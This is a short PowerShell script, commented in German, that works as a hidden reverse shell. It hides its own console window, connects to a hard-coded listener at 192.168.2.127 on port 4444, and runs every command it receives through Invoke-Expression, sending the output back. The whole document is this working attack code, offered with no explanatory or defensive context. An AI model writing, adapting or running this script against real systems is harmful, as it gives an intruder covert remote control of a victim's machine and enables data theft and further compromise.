# Fenster verstecken
$showWindow = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name "Win32ShowWindow" -Namespace Win32Functions -PassThru
$showWindow::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 0)

# Verbindungseinstellungen
$LHOST = "192.168.2.127"
$LPORT = 4444

# Reverse Shell Logik
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024

while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        $Code = ([text.encoding]::ASCII).GetString($Buffer, 0, $RawData)
        $Output = try { Invoke-Expression $Code 2>&1 | Out-String } catch { $_ | Out-String }
        $StreamWriter.Write($Output)
    }
    Start-Sleep -Milliseconds 100
}
$TCPClient.Close()
